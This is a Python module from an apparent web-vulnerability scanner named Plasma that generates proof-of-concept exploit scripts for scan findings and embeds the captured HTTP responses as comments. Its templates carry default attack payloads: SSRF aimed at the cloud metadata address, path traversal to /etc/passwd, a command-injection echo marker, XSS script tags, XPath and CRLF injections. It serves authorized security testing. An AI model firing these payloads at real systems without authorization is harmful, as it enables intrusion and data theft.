"""
reporting/poc_creator.py — Plasma v3
──────────────────────────────────────
Multi-vulnerability PoC generator.

Each generated file includes:
  1. Exploit / reproduce code
  2. Raw HTTP response (UNAUTHENTICATED) — full headers + body, curl -i style
  3. Raw HTTP response (AUTHENTICATED)   — when auth was configured
  4. Responses truncated at RAW_RESPONSE_MAX_CHARS with a clear marker

Raw responses are embedded as Python comments so the file remains valid,
executable Python (or HTML, as appropriate).

All existing PoC logic is preserved; only the response embedding is new.
"""

from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Optional

from core.models import Finding, VulnType

log = logging.getLogger(__name__)

_TEMPLATE_DIR = Path(__file__).parent.parent / "templates"

# Must match bypass_engine.RAW_RESPONSE_MAX_CHARS
RAW_RESPONSE_MAX_CHARS: int = 5_000
_TRUNCATION_MARKER = "# --- RESPONSE TRUNCATED ---"


# ─── Raw response formatter ───────────────────────────────────────────────────

def _format_raw_response_block(
    label:    str,
    raw:      Optional[str],
    fallback: str = "N/A — response not captured",
) -> str:
    """
    Render a clearly labelled raw-response comment block, safe for embedding
    inside a Python source file.  Every line is prefixed with `# ` so the
    block is never executed.

    Example output:
        # ======================================================
        # RAW HTTP RESPONSE (UNAUTHENTICATED)
        # ======================================================
        # HTTP/1.1 200 OK
        # Content-Type: text/html
        # ...
        # <body>
        # ======================================================
    """
    border = "=" * 54
    if not raw:
        body = fallback
    else:
        body = raw.rstrip()
        # Truncate if the caller didn't already do so
        if len(body) > RAW_RESPONSE_MAX_CHARS:
            body = body[:RAW_RESPONSE_MAX_CHARS].rstrip()
            body += f"\n{_TRUNCATION_MARKER}"

    # Prefix every body line with "# "
    commented = "\n".join(f"# {line}" for line in body.splitlines())

    return (
        f"# {border}\n"
        f"# RAW HTTP RESPONSE ({label})\n"
        f"# {border}\n"
        f"{commented}\n"
        f"# {border}"
    )


# ─── PoCCreator ──────────────────────────────────────────────────────────────

class PoCCreator:
    """
    Generates PoC artifacts for any Finding type.

    For CSRF findings, delegates to the existing PoCGenerator.
    For other vulnerability types, renders Python/curl/HTML templates
    with embedded raw HTTP response blocks.
    """

    def __init__(self, output_dir: str = "poc_output") -> None:
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def create(self, finding: Finding) -> str | None:
        """Generate a PoC file for a Finding.  Returns path or None."""
        dispatch = {
            VulnType.CSRF:          self._poc_csrf,
            VulnType.SQLI:          self._poc_sqli,
            VulnType.XSS:           self._poc_xss,
            VulnType.SSRF:          self._poc_ssrf,
            VulnType.RCE:           self._poc_rce,
            VulnType.DIR_TRAVERSAL: self._poc_traversal,
            VulnType.IDOR:          self._poc_idor,
            VulnType.ACCESS_BYPASS: self._poc_bypass,
            VulnType.XPATH_INJ:     self._poc_xpath,
            VulnType.CRLF_INJ:      self._poc_crlf,
            VulnType.OTHER:         self._poc_chain,   # exploit chains use VulnType.OTHER
        }
        handler = dispatch.get(finding.vuln_type, self._poc_generic)
        try:
            return handler(finding)
        except Exception as exc:
            log.warning("PoC creation failed for %s: %s", finding.id, exc)
            return None

    def create_all(self, findings: list[Finding]) -> list[str]:
        """Generate PoCs for a list of findings; return list of created paths."""
        paths = []
        for f in findings:
            path = self.create(f)
            if path:
                paths.append(path)
        return paths

    # ── Shared helper: extract raw response blocks from Evidence ─────────────

    @staticmethod
    def _raw_blocks(f: Finding) -> str:
        """
        Build both raw-response comment blocks from Finding.evidence.
        Returns a string ready to embed at the bottom of any PoC file.
        """
        unauth_raw = getattr(f.evidence, "raw_response_unauth", None)
        auth_raw   = getattr(f.evidence, "raw_response_auth",   None)

        unauth_block = _format_raw_response_block("UNAUTHENTICATED", unauth_raw)
        auth_block   = _format_raw_response_block(
            "AUTHENTICATED",
            auth_raw,
            fallback="N/A — no authenticated session was configured (use --login-url or --auth-cookie)",
        )

        return f"\n\n{unauth_block}\n\n{auth_block}"

    # ── Per-vulnerability PoC handlers ────────────────────────────────────────

    def _poc_csrf(self, f: Finding) -> str | None:
        """Delegate to the existing HTML PoC generator."""
        if f.endpoint is None:
            return None
        from modules.poc_generator import PoCGenerator
        old_ep = _MockEndpoint(f.endpoint)
        gen    = PoCGenerator(output_dir=self.output_dir)
        result = gen._render(old_ep, hash(f.id) % 9999)   # type: ignore
        return result.output_path if result else None

    def _poc_sqli(self, f: Finding) -> str:
        url     = f.evidence.request_url or (f.endpoint.url if f.endpoint else "TARGET")
        method  = f.evidence.request_method or "POST"
        payload = f.evidence.payload_used or "'"
        raw     = self._raw_blocks(f)
        content = f'''#!/usr/bin/env python3
"""
Plasma — SQL Injection PoC
Finding: {f.title}
Endpoint: {url}
OWASP: {f.owasp_id}   CWE: {f.cwe_id}
WARNING: FOR AUTHORIZED TESTING ONLY
"""
import requests

TARGET  = "{url}"
PAYLOAD = {payload!r}
PARAMS  = {{"id": PAYLOAD}}   # adjust parameter name as needed

response = requests.{"post" if method.upper() == "POST" else "get"}(
    TARGET,
    {"data" if method.upper() == "POST" else "params"}=PARAMS,
    timeout=10,
)
print(f"Status: {{response.status_code}}")
print(f"Response length: {{len(response.text)}}")

# Detection: look for DB error strings
errors = ["sql syntax", "ora-", "warning: mysql", "sqlite3", "pg_query"]
for err in errors:
    if err in response.text.lower():
        print(f"[!] Potential SQLi confirmed — matched: {{err}}")
        break
{raw}
'''
        return self._write(f"sqli_{f.id[:8]}.py", content)

    def _poc_xss(self, f: Finding) -> str:
        url     = f.evidence.request_url or (f.endpoint.url if f.endpoint else "TARGET")
        payload = f.evidence.payload_used or "<script>alert(1)</script>"
        raw     = self._raw_blocks(f)
        # Embed raw HTTP response blocks inside an HTML comment.
        # Each line already starts with "# " from _raw_blocks(); we convert
        # those to "  " (spaces) so they read cleanly inside <!-- ... -->.
        raw_html_comment = raw.replace("\n# ", "\n  ").lstrip("# ")
        content = f'''<!DOCTYPE html>
<!-- Plasma XSS PoC | {f.title} | {f.owasp_id} -->
<!-- WARNING: FOR AUTHORIZED TESTING ONLY -->
<html><head><title>XSS PoC</title></head>
<body>
  <div style="background:#c00;color:#fff;padding:10px;font-family:monospace">
    WARNING: Plasma XSS PoC — FOR AUTHORIZED TESTING ONLY
  </div>
  <p>Target: <code>{url}</code></p>
  <p>Payload: <code>{payload}</code></p>
  <p>When loaded in a browser with a victim session, this page demonstrates
     that the parameter reflects unsanitised input.</p>
  <script>
    const target  = "{url}";
    const payload = {payload!r};
    console.log("XSS PoC — injecting into:", target, "payload:", payload);
  </script>
<!--
{raw_html_comment}
-->
</body></html>
'''
        return self._write(f"xss_{f.id[:8]}.html", content)

    def _poc_ssrf(self, f: Finding) -> str:
        url     = f.evidence.request_url or (f.endpoint.url if f.endpoint else "TARGET")
        payload = f.evidence.payload_used or "http://169.254.169.254/latest/meta-data/"
        raw     = self._raw_blocks(f)
        content = f'''#!/usr/bin/env python3
"""
Plasma — SSRF PoC
Finding: {f.title}
Endpoint: {url}
WARNING: FOR AUTHORIZED TESTING ONLY
"""
import requests

TARGET  = "{url}"
PAYLOAD = "{payload}"
PARAMS  = {{"url": PAYLOAD}}   # inject into the vulnerable parameter

response = requests.get(TARGET, params=PARAMS, timeout=15)
print(f"Status: {{response.status_code}}")
print(f"Response (first 500 chars): {{response.text[:500]}}")
# If the response contains cloud metadata / internal content -> SSRF confirmed
{raw}
'''
        return self._write(f"ssrf_{f.id[:8]}.py", content)

    def _poc_rce(self, f: Finding) -> str:
        url     = f.evidence.request_url or (f.endpoint.url if f.endpoint else "TARGET")
        payload = f.evidence.payload_used or "; echo PLRCE_CONFIRMED"
        raw     = self._raw_blocks(f)
        content = f'''#!/usr/bin/env python3
"""
Plasma — RCE / Command Injection PoC
Finding: {f.title}
Endpoint: {url}
WARNING: FOR AUTHORIZED TESTING ONLY
"""
import requests

TARGET  = "{url}"
PAYLOAD = {payload!r}
PARAMS  = {{"cmd": PAYLOAD}}   # adjust parameter name

response = requests.post(TARGET, data=PARAMS, timeout=15)
print(f"Status: {{response.status_code}}")
if "PLRCE_CONFIRMED" in response.text:
    print("[!] RCE CONFIRMED — echo marker found in response")
else:
    print("[-] Marker not found — try time-based detection")
{raw}
'''
        return self._write(f"rce_{f.id[:8]}.py", content)

    def _poc_traversal(self, f: Finding) -> str:
        url     = f.evidence.request_url or (f.endpoint.url if f.endpoint else "TARGET")
        payload = f.evidence.payload_used or "../../../../etc/passwd"
        raw     = self._raw_blocks(f)
        content = f'''#!/usr/bin/env python3
"""
Plasma — Directory Traversal PoC
Finding: {f.title}
Endpoint: {url}
WARNING: FOR AUTHORIZED TESTING ONLY
"""
import requests

TARGET  = "{url}"
PAYLOAD = "{payload}"
PARAMS  = {{"file": PAYLOAD}}   # adjust parameter name

response = requests.get(TARGET, params=PARAMS, timeout=10)
print(f"Status: {{response.status_code}}")
if "root:x:" in response.text or "[extensions]" in response.text:
    print("[!] Traversal CONFIRMED — system file contents in response")
print(f"Response snippet: {{response.text[:300]}}")
{raw}
'''
        return self._write(f"traversal_{f.id[:8]}.py", content)

    def _poc_idor(self, f: Finding) -> str:
        url = f.evidence.request_url or (f.endpoint.url if f.endpoint else "TARGET")
        raw = self._raw_blocks(f)
        content = f'''#!/usr/bin/env python3
"""
Plasma — IDOR PoC
Finding: {f.title}
Endpoint: {url}
WARNING: FOR AUTHORIZED TESTING ONLY
"""
import requests

TARGET  = "{url}"
HEADERS = {{}}   # add authentication headers here
COOKIES = {{}}   # add session cookies here

for id_value in range(1, 20):
    r = requests.get(
        TARGET,
        params={{"id": id_value}},
        headers=HEADERS,
        cookies=COOKIES,
        timeout=10,
    )
    print(f"ID={{id_value}}  status={{r.status_code}}  length={{len(r.text)}}")
{raw}
'''
        return self._write(f"idor_{f.id[:8]}.py", content)

    def _poc_bypass(self, f: Finding) -> str:
        """
        PoC for ACCESS_BYPASS findings (produced by BypassEngine).
        Reproduces the exact bypass technique that succeeded.
        """
        url        = f.evidence.request_url or (f.endpoint.url if f.endpoint else "TARGET")
        method     = f.evidence.request_method or "GET"
        headers    = f.evidence.request_headers or {}
        payload    = f.evidence.payload_used or ""
        status     = f.evidence.response_status
        raw        = self._raw_blocks(f)
        notes      = f.evidence.notes or ""
        headers_repr = repr(headers)
        content = f'''#!/usr/bin/env python3
"""
Plasma — Access Control Bypass PoC
Finding: {f.title}
Endpoint: {url}
Technique: {notes}
Result: HTTP {status}
OWASP: {f.owasp_id}   CWE: {f.cwe_id}
WARNING: FOR AUTHORIZED TESTING ONLY
"""
import requests

TARGET  = "{url}"
METHOD  = "{method}"
HEADERS = {headers_repr}
PAYLOAD = {payload!r}

session  = requests.Session()
response = session.request(
    METHOD,
    url=TARGET,
    headers=HEADERS,
    {"data=PAYLOAD," if method.upper() in ("POST","PUT","PATCH") else "params={} if not PAYLOAD else {'q': PAYLOAD},"}
    timeout=10,
    allow_redirects=True,
)
print(f"Status : {{response.status_code}}")
print(f"Size   : {{len(response.content)}} bytes")
print(f"Headers: {{dict(response.headers)}}")
{raw}
'''
        return self._write(f"bypass_{f.id[:8]}.py", content)

    def _poc_xpath(self, f: Finding) -> str:
        """PoC for XPath injection."""
        url     = f.evidence.request_url or (f.endpoint.url if f.endpoint else "")
        method  = f.evidence.request_method or "GET"
        param   = f.title.split("'")[1] if "'" in f.title else "param"
        payload = f.evidence.payload_used or "' or '1'='1"
        raw     = self._raw_blocks(f)
        title   = f.title
        owasp   = f.owasp_id or "A03:2021"
        cwe     = f.cwe_id   or "CWE-643"
        body = (
            "#!/usr/bin/env python3\n"
            '"""\n'
            f"Plasma \u2014 XPath Injection PoC\n"
            f"Finding : {title}\n"
            f"Endpoint: {url}\n"
            f"Param   : {param}\n"
            f"OWASP   : {owasp}   CWE: {cwe}\n"
            "WARNING : FOR AUTHORIZED TESTING ONLY\n"
            '"""\n'
            "import requests, re\n\n"
            f"TARGET  = {url!r}\n"
            f"METHOD  = {method!r}\n"
            f"PARAM   = {param!r}\n"
            f"PAYLOAD = {payload!r}\n\n"
            "session  = requests.Session()\n"
            "params   = {PARAM: PAYLOAD}\n"
            'response = session.request(\n'
            '    METHOD, url=TARGET,\n'
            '    **({"data": params} if METHOD in ("POST", "PUT") else {"params": params}),\n'
            '    timeout=10, allow_redirects=True,\n'
            ')\n'
            'print(f"Status  : {response.status_code}")\n'
            'print(f"Size    : {len(response.content)} bytes")\n\n'
            '# Check for XPath error signatures\n'
            'XPATH_ERRORS = [r"xpath.*error", r"XPathException", r"SimpleXML", r"DOMXPath"]\n'
            'for pattern in XPATH_ERRORS:\n'
            '    if re.search(pattern, response.text, re.I):\n'
            '        print(f"[!] XPath error detected: {pattern}")\n'
            '        break\n'
            f"{raw}\n"
        )
        return body

    def _poc_crlf(self, f: Finding) -> str:
        """PoC for CRLF injection / HTTP response splitting."""
        url     = f.evidence.request_url or (f.endpoint.url if f.endpoint else "")
        method  = f.evidence.request_method or "GET"
        param   = f.title.split("'")[1] if "'" in f.title else "param"
        payload = f.evidence.payload_used or "%0d%0aX-Plasma-Injected: confirmed"
        raw     = self._raw_blocks(f)
        title   = f.title
        owasp   = f.owasp_id or "A03:2021"
        cwe     = f.cwe_id   or "CWE-113"
        body = (
            "#!/usr/bin/env python3\n"
            '"""\n'
            f"Plasma \u2014 CRLF Injection PoC\n"
            f"Finding : {title}\n"
            f"Endpoint: {url}\n"
            f"Param   : {param}\n"
            f"OWASP   : {owasp}   CWE: {cwe}\n"
            "WARNING : FOR AUTHORIZED TESTING ONLY\n"
            '"""\n'
            "import requests\n\n"
            f"TARGET  = {url!r}\n"
            f"METHOD  = {method!r}\n"
            f"PARAM   = {param!r}\n"
            f"PAYLOAD = {payload!r}\n\n"
            "session  = requests.Session()\n"
            "params   = {PARAM: PAYLOAD}\n"
            "response = session.request(\n"
            "    METHOD, url=TARGET,\n"
            '    **({"data": params} if METHOD in ("POST", "PUT") else {"params": params}),\n'
            "    timeout=10, allow_redirects=False,\n"
            ")\n"
            'print(f"Status  : {response.status_code}")\n'
            'print(f"Headers : {dict(response.headers)}")\n'
            'if "X-Plasma-Injected" in response.headers:\n'
            '    print("[!] CRLF injection CONFIRMED \u2014 injected header present")\n'
            f"{raw}\n"
        )
        return body

    def _poc_chain(self, f: Finding) -> str:
        """PoC for multi-step exploit chains."""
        notes      = f.evidence.notes or ""
        chain_type = ""
        for part in notes.split():
            if part.startswith("chain="):
                chain_type = part[6:]
        raw   = self._raw_blocks(f)
        url   = f.evidence.request_url or ""
        title = f.title
        owasp = f.owasp_id or "A01:2021"
        cwe   = f.cwe_id   or "CWE-284"
        desc  = f.description[:600]
        step1_label = chain_type.split("\u2192")[0] if "\u2192" in chain_type else "Initial Exploitation"
        step2_label = chain_type.split("\u2192")[1] if "\u2192" in chain_type else "Escalation"
        body = (
            "#!/usr/bin/env python3\n"
            '"""\n'
            f"Plasma \u2014 Exploit Chain PoC\n"
            f"Finding    : {title}\n"
            f"Chain Type : {chain_type}\n"
            f"Endpoint   : {url}\n"
            f"OWASP      : {owasp}   CWE: {cwe}\n"
            "WARNING    : FOR AUTHORIZED TESTING ONLY\n\n"
            "CHAIN OVERVIEW\n"
            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
            f"{desc}\n\n"
            "HOW TO USE\n"
            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
            "1. Execute Step 1 to confirm the initial vulnerability.\n"
            "2. Extract the value / access gained from Step 1.\n"
            "3. Use that value as input to Step 2.\n"
            "4. Observe escalated access or data exposure.\n"
            '"""\n'
            "import requests\n\n"
            "session = requests.Session()\n\n"
            f"# \u2500\u2500 STEP 1: {step1_label} \u2500\u2500\n"
            f"STEP1_URL     = {url!r}\n"
            'STEP1_PAYLOAD = "REPLACE_WITH_STEP1_PAYLOAD"\n'
            'STEP1_PARAM   = "REPLACE_WITH_STEP1_PARAM"\n\n'
            "resp1 = session.get(STEP1_URL, params={STEP1_PARAM: STEP1_PAYLOAD}, timeout=10)\n"
            'print(f"Step 1 status : {resp1.status_code}")\n'
            "step1_value = resp1.text[:200]\n"
            'print(f"Step 1 output : {step1_value[:100]}")\n\n'
            f"# \u2500\u2500 STEP 2: {step2_label} \u2500\u2500\n"
            'STEP2_URL     = "REPLACE_WITH_STEP2_URL"\n'
            "STEP2_PAYLOAD = step1_value\n"
            'STEP2_PARAM   = "REPLACE_WITH_STEP2_PARAM"\n\n'
            "resp2 = session.get(STEP2_URL, params={STEP2_PARAM: STEP2_PAYLOAD}, timeout=10)\n"
            'print(f"Step 2 status : {resp2.status_code}")\n'
            'print(f"Step 2 output : {resp2.text[:200]}")\n'
            f"{raw}\n"
        )
        return body


    def _poc_generic(self, f: Finding) -> str:
        raw     = self._raw_blocks(f)
        content = f'''#!/usr/bin/env python3
"""
Plasma — Generic Evidence PoC
Finding: {f.title}
Type: {f.vuln_type.value}
Severity: {f.severity.value}
Endpoint: {f.endpoint.url if f.endpoint else "N/A"}
Payload: {f.evidence.payload_used or "N/A"}
WARNING: FOR AUTHORIZED TESTING ONLY
"""
# See the full report for remediation guidance.
# Evidence: {f.evidence.notes or "See report"}
{raw}
'''
        name = f.vuln_type.value.lower().replace(" ", "_")
        return self._write(f"poc_{name}_{f.id[:8]}.py", content)

    def _write(self, filename: str, content: str) -> str:
        path = os.path.join(self.output_dir, filename)
        Path(path).write_text(content, encoding="utf-8")
        log.debug("PoC written: %s", path)
        return path


# ─── Legacy adapter ───────────────────────────────────────────────────────────

class _MockEndpoint:
    """Adapts models.Endpoint to the legacy poc_generator.Endpoint interface."""
    def __init__(self, ep):
        self.url               = ep.url
        self.method            = ep.method
        self.source_page       = ep.source_page
        self.enctype           = ep.content_type
        self.inputs            = [
            {"name": k, "type": "text", "value": v}
            for k, v in ep.parameters.items()
        ]
        self.is_state_changing = ep.is_state_changing
        self.has_file_upload   = ep.has_file_upload
        self.raw_html          = ep.raw_html
        self.csrf_token_field  = None
